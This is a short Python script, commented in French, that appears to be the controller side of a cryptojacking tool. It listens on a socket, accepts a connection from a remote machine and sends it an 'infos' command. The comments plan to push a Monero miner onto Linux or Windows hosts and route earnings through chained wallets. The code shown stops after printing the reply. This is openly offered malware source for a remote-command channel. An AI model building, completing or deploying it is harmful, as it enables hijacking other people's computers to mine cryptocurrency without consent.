import socket

# Envois d'un shell pour miner du monero via Socket 

# Si "Linux" in infos     -> https://goopensource.fr/miner-du-monero-sur-debian-via-xmrig/
# Si "Windows" in infos   -> https://www.getmonero.org/fr/resources/user-guides/mine-to-pool.html
# Tous transferez dans un portfeuille qui transfere vers portfeuille

HOST_IP = ""
HOST_PORT = 32000
MAX_DATA_SIZE = 1024

def socket_receive_all_data(socket_p, data_len):
    current_data_len = 0
    total_data = None
    # print("socket_receive_all_data len:", data_len)
    while current_data_len < data_len:
        chunk_len = data_len - current_data_len
        if chunk_len > MAX_DATA_SIZE:
            chunk_len = MAX_DATA_SIZE
        data = socket_p.recv(chunk_len)
        # print("  len:", len(data))
        if not data:
            return None
        if not total_data:
            total_data = data
        else:
            total_data += data
        current_data_len += len(data)
        # print("  total len:", current_data_len, "/", data_len)
    return total_data

def socket_send_command_and_receive_all_data(socket_p, command):
    if not command:  # if command == ""
        return None
    socket_p.sendall(command.encode())

    header_data = socket_receive_all_data(socket_p, 13)
    longeur_data = int(header_data.decode())

    data_recues = socket_receive_all_data(socket_p, longeur_data)
    return data_recues

def monero():
    s = socket.socket()
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((HOST_IP, HOST_PORT))
    s.listen()

    print(f"Attente de connexion sur {HOST_IP}, port {HOST_PORT}...")
    connection_socket, client_address = s.accept()
    print(f"Connexion établie avec {client_address}")

    infos_data = socket_send_command_and_receive_all_data(connection_socket, "infos")
    print(infos_data)



